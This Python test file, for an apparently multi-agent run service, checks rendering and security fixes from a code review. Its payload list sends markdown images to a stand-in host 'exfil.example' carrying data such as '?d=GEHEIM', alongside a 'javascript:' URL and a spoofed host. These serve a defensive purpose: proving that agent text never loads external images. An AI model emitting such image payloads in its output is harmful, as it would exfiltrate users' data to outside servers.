"""W4-06.1 Nacharbeit nach dem Review W4-06 (Befunde 1–5) und B1.

1. Tables only for `summary.md`: an agent's long line with `|` does not stall the service
   (markdown2's table search is quadratic in such a line).
2. Images with an external address in agent text are never `<img>`; the service sends a
   Content-Security-Policy on every answer (second wall).
3. 300 nested quotes in a chat message: the run page still loads.
4. A formula in a link title stays inside the attribute.
5. F3 with two agents in one inbox: the turn end of one closes nothing of the other.
6. B1: the roles of `proof-review` fit together.

Real files, NiceGUI user simulation on a RealApi or a real `arr serve` child; no model.
"""

import asyncio
import re
import time
from html.parser import HTMLParser
from importlib import resources
from pathlib import Path

import pytest
from service_kit import ServiceProcess, append, make_run_folder, start_service, transcript_line
from service_kit import make_workfolder as service_workfolder
from test_codex_backend import play, setup, simple_turn
from test_gui_real import see
from test_gui_runs_real import make_api, real_user, wf

from arr.models import RunStatus
from arr.permissions.policy import Assessment
from arr.permissions.types import (
    ApprovalStatus,
    ApprovalType,
    DecidedBy,
    Decision,
    DecisionAction,
    PermissionRequest,
)
from arr.room.store import RoomStore
from arr.service import guard
from arr.service.gui.components import base
from arr.service.gui.components.base import markdown_html

__all__ = ["setup", "wf"]

EXFIL = "exfil.example"
IMAGES = [
    f"![beleg](https://{EXFIL}/c?d=GEHEIM)",
    f"![beleg](HTTP://{EXFIL}/c)",
    f"![beleg](//{EXFIL}/c)",
    f"![beleg](/\\{EXFIL}/c)",
    f"![beleg]( https://{EXFIL}/c )",
    f'![beleg](https://{EXFIL}/c "Titel $x$")',
    f"![beleg][r]\n\n[r]: https://{EXFIL}/ref",
    f"![beleg](https:&#x2F;&#x2F;{EXFIL}/c)",
    f"![beleg](ht\ttps://{EXFIL}/c)",
    f"![$a$](https://{EXFIL}/c)",
    f"- ![beleg](https://{EXFIL}/c)",
    f"> ![beleg](https://{EXFIL}/c)",
    "![beleg](data:image/png;base64,AAAA)",
    "![beleg](javascript:alert(1))",
]


class Tags(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.found: list[tuple[str, dict[str, str]]] = []

    def handle_starttag(self, tag, attrs):  # noqa: ANN001
        self.found.append((tag, {k: v or "" for k, v in attrs}))


def tags_of(html: str) -> list[tuple[str, dict[str, str]]]:
    parser = Tags()
    parser.feed(html)
    return parser.found


# --- 2: external images ------------------------------------------------------------------------


@pytest.mark.parametrize("text", IMAGES)
def test_an_external_image_is_text_never_img(text: str) -> None:
    for tables in (False, True):
        out = markdown_html(text, tables=tables)
        assert not [a for t, a in tags_of(out) if t == "img"], out
        assert "(externe Adresse, nicht geladen)" in out, out


def test_a_relative_image_stays_for_the_run_files() -> None:
    out = markdown_html("![Plot](plots/a.png)")
    assert [a["src"] for t, a in tags_of(out) if t == "img"] == ["plots/a.png"]


async def test_no_external_image_in_any_source_of_agent_text(wf: Path) -> None:
    """Chat, transcript (text and thinking), result, summary and task of a run page: the
    browser gets no `<img>` with an external address, only the text."""
    image = f"![beleg](https://{EXFIL}/c?d=GEHEIM)"
    folder = make_run_folder(wf, status=RunStatus.DONE, agents=["a"], name="Bilder")
    store = RoomStore.create(folder)
    store.for_agent("a").post_message("main", f"Kanal {image}")
    store.for_agent("a").submit_result(kind="proof", title="Beweis", body=f"Ergebnis {image}")
    (folder / "output").mkdir(exist_ok=True)
    (folder / "output" / "summary.md").write_text(f"# Zusammenfassung\n\nSumme {image}\n")
    (folder / "task.md").write_text(f"# Aufgabe\n\nAufgabe {image}\n", "utf-8")
    lines = [
        transcript_line(1, "a", folder.name, "turn_start", {"turn": 1, "prompt": "Los."}),
        transcript_line(2, "a", folder.name, "thinking", {"text": f"Denken {image}"}),
        transcript_line(3, "a", folder.name, "text", {"text": f"Text {image}"}),
    ]
    append(folder / "agents" / "a" / "transcript.jsonl", "".join(f"{x}\n" for x in lines))
    pages = [
        ("?kanal=main", "Kanal"),
        ("?agent=a", "Text"),
        ("?ansicht=ergebnisse", "Summe"),
        ("?ansicht=eingaben", "Aufgabe"),
    ]
    async with real_user(make_api(wf)) as user:
        for query, word in pages:
            await user.open(f"/runs/{folder.name}{query}")
            html = await see(user, "Bild: beleg (externe Adresse, nicht geladen)", retries=200)
            assert f'{word} <span class="ext-img"' in html, query
            if query == "?agent=a":
                assert 'Denken <span class="ext-img"' in html, "thinking too"
            loaded = [a["src"] for t, a in tags_of(html) if t == "img" and EXFIL in a["src"]]
            assert loaded == [], f"{query}: {loaded}"
        await user.open(f"/runs/{folder.name}?ansicht=ergebnisse")
        html = await see(user, 'Ergebnis <span class="ext-img"', retries=200)
        assert not [a for t, a in tags_of(html) if t == "img" and EXFIL in a.get("src", "")]


@pytest.fixture(scope="module")
def service(tmp_path_factory: pytest.TempPathFactory):  # noqa: ANN201
    tmp = tmp_path_factory.mktemp("csp")
    arr_home = tmp / "home"
    arr_home.mkdir()
    proc = start_service(tmp, arr_home, service_workfolder(tmp))
    try:
        yield proc
    finally:
        proc.stop()


def test_every_answer_of_the_service_carries_the_csp(service: ServiceProcess) -> None:
    """Pages, static files, the NiceGUI endpoints, a refusal, the token redirect, a wrong host
    and `/mcp`: each answer has exactly one CSP with `img-src 'self' data:`."""
    csp = guard.CSP.decode()
    assert "img-src 'self' data:" in csp and "object-src 'none'" in csp
    assert "media-src 'self'" in csp and "frame-src 'none'" in csp
    answers = []
    with service.client(cookie=True) as http:
        for path in ("/", "/runs", "/freigaben", "/projekte", "/arr-static/arr.js"):
            answers.append((path, http.get(path)))
    with service.client() as http:
        answers.append(("ohne Cookie", http.get("/")))
        answers.append(("Token-Link", http.get(f"/?token={service.token}")))
        answers.append(("/mcp", http.post("/mcp/", json={})))
    with service.client(host=f"evil.localhost:{service.port}") as http:
        answers.append(("fremder Host", http.get("/")))
    for where, answer in answers:
        assert answer.headers.get_list("content-security-policy") == [csp], where


# --- 1: no quadratic tables in agent text ------------------------------------------------------


def test_long_pipe_lines_render_fast_also_with_tables() -> None:
    line = "|" * 64_000
    for tables in (False, True):
        start = time.perf_counter()
        markdown_html(line + "\nEnde\n", tables=tables)
        assert time.perf_counter() - start < 1.0, f"tables={tables}"
    table = "| a | b |\n|---|---|\n| 1 | 2 |\n"
    assert "<table>" in markdown_html(table, tables=True)
    assert "<table>" not in markdown_html(table), "agent text gets no tables"
    long_cell = "| " + "x" * base.TABLE_LINE_MAX + " | b |\n|---|---|\n| 1 | 2 |\n"
    assert "<table>" not in markdown_html(long_cell, tables=True), "a too long line: no table"


@pytest.mark.parametrize("where", ["transcript", "chat"])
async def test_a_long_pipe_line_does_not_stall_the_event_loop(wf: Path, where: str) -> None:
    """Review W4-06 finding 1: 64 KB `|` in an agent's transcript (a chat message has at most
    3000 characters) stalled the service's event loop for seconds. A ticker in the same loop
    measures the longest gap while the page renders it."""
    folder = make_run_folder(wf, status=RunStatus.DONE, agents=["a"], name="Pipes")
    if where == "chat":
        RoomStore.create(folder).for_agent("a").post_message("main", "|" * 2990 + "\nEnde")
        query = "?kanal=main"
    else:
        lines = [
            transcript_line(1, "a", folder.name, "turn_start", {"turn": 1, "prompt": "Los."}),
            transcript_line(2, "a", folder.name, "text", {"text": "|" * 64_000 + "\nEnde\n"}),
        ]
        append(folder / "agents" / "a" / "transcript.jsonl", "".join(f"{x}\n" for x in lines))
        query = "?agent=a"
    gaps: list[float] = [0.0]

    async def ticker() -> None:
        last = time.perf_counter()
        while True:
            await asyncio.sleep(0.05)
            now = time.perf_counter()
            gaps.append(now - last)
            last = now

    async with real_user(make_api(wf)) as user:
        task = asyncio.create_task(ticker())
        await user.open(f"/runs/{folder.name}{query}")
        await see(user, "Ende", retries=200)
        task.cancel()
    assert max(gaps) < 1.0, f"event loop blocked {max(gaps):.1f} s"


# --- 3: deep nesting -------------------------------------------------------------------------


async def test_deep_quote_in_a_chat_message(wf: Path) -> None:
    """Review W4-06 finding 3 (test of the reviewer): 300 × `>` made markdown2 raise
    RecursionError and the run page answer HTTP 500. Now the text shows as it is."""
    folder = make_run_folder(wf, status=RunStatus.DONE, agents=["a"], name="Tief")
    room = RoomStore.create(folder).for_agent("a")
    room.post_message("main", "Erste Nachricht, gut lesbar.")
    room.post_message("main", ">" * 300 + " tief")
    room.post_message("main", "Dritte Nachricht: Frage?")
    async with real_user(make_api(wf)) as user:
        await user.open(f"/runs/{folder.name}?kanal=main")
        html = await see(user, "Erste Nachricht", retries=100)
        assert "Dritte Nachricht" in html
        assert '<pre class="md-raw">' + "&gt;" * 300 + " tief</pre>" in html


def test_deep_lists_and_quotes_render_as_text() -> None:
    deep_list = "".join("  " * i + "- x\n" for i in range(400))
    for text in (">" * 300 + " tief", deep_list):
        out = markdown_html(text)
        assert out.startswith('<pre class="md-raw">') and "<script" not in out


# --- 4: a formula inside an attribute -------------------------------------------------------


@pytest.mark.parametrize(
    "text",
    [
        '[Link](https://a.example/x "Titel $x^2$")',
        "[Link](https://a.example/x 'Titel `code`')",
        '![Plot $x$](plots/a.png "Bild $y$")',
        "[Link $x$](https://a.example/$y$)",
    ],
)
def test_a_formula_or_code_in_an_attribute_stays_inside_it(text: str) -> None:
    out = markdown_html(text)
    for tag, attrs in tags_of(out):
        for name, value in attrs.items():
            assert "<span" not in value and "<code" not in value, (tag, name, value)
            assert not name.startswith("on") and name != "math", (tag, name)
    assert not re.search(r'="[^"]*<', out), out


# --- 5: F3 with two agents in one inbox --------------------------------------------------------


async def test_f3_the_turn_end_of_one_agent_leaves_the_requests_of_another(setup) -> None:
    """Review W4-06, mutation gap: in a run all agents share one inbox. The turn end of gpt-1
    closes neither the question nor the open permission request of gpt-2."""
    backend, _, inbox = setup([simple_turn()])
    await backend.start()
    request = PermissionRequest(run_id="R", agent_id="gpt-2", tool="Bash", command="pip install x")
    ask = Decision(action=DecisionAction.ASK, decided_by=DecidedBy.FIXED_RULE, reason="Frage")
    waiter = asyncio.create_task(inbox.ask(Assessment(ask, request, frozenset())))
    while not [i for i in inbox.pending() if i.type is ApprovalType.PERMISSION]:  # noqa: ASYNC110
        await asyncio.sleep(0.01)
    question = inbox.open_question("R", "gpt-2", "main", 3, "@user Und ich?")
    await play(backend)
    await backend.close()
    [permission] = [i for i in inbox.items() if i.type is ApprovalType.PERMISSION]
    assert permission.status is ApprovalStatus.OPEN, "gpt-2's request stays open"
    assert inbox.get(question.id).status is ApprovalStatus.OPEN
    waiter.cancel()
    with pytest.raises(asyncio.CancelledError):
        await waiter


# --- 6: B1 roles of proof-review ---------------------------------------------------------------


def role(name: str) -> str:
    base = resources.files("arr").joinpath("templates", "skills", "proof-review", "roles")
    return base.joinpath(f"{name}.md").read_text("utf-8")


def test_b1_the_judge_takes_the_changes_section_as_part_of_the_version() -> None:
    judge = role("judge")
    assert "`## Änderungen`" in judge and "kein Mangel" in judge
    assert "nur echte Mängel, keine Bestätigungen" in judge
    author = role("author")
    assert "`## Änderungen`" in author, "the author still writes it, so arr keeps the list"
    assert "nicht nur eine Liste von Änderungen" in author
    assert "als eigene Datei bei, nicht in den Beweistext" in author
